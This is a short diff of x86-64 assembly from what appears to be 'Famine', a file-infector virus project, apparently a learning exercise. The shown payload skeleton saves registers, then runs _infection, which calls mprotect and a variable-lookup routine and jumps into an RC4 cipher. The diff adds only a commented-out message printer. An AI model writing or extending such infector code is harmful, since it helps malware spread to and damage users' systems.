@@ -1,12 +1,16 @@
 BITS 64
 
 SECTION .data
+        ; famine_msg: db "....FAMINE....",10
+        ; famine_msg_len  : equ $-famine_msg
         famine_mark: db "Famine version 1.0 (c)oded by mabouce",10
         key_msg: times 128 db "D"
         key_len: dw 0x80
         stream: times 256 db 0x00
 
 SECTION .text
+%define WRITE 1
+%define STDOUT 1
 
 _start_payload:
     push rax                 ; save all clobbered registers
@@ -18,9 +22,19 @@ _start_payload:
     jmp _infection
 
 _infection:
+    ; call _print_famine
     call _mprotect
     call _getvar
     jmp rc4_cipher_start
+
+
+; _print_famine:
+;     mov rax,WRITE                       ; sys_write
+;     mov rdi,STDOUT                       ; stdout
+;     mov rdx,famine_msg_len           ;len
+;     lea rsi,[rel $+famine_msg-$]     ; woody
+;     syscall
+;     ret
 
 _end_payload:
     pop r11
